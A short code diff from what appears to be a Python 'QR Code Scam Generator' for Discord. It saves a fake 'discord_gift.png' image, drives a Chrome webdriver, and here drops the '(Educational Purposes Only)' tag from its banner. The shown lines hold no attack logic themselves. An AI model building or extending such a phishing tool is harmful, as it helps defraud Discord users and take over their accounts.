@@ -22,7 +22,7 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print('github.com/NightfallGT/Discord-QR-Scam (Educational Purposes Only)\n')
+    print('github.com/NightfallGT/Discord-QR-Scam\n')
     print('** QR Code Scam Generator **')
 
     options = webdriver.ChromeOptions()
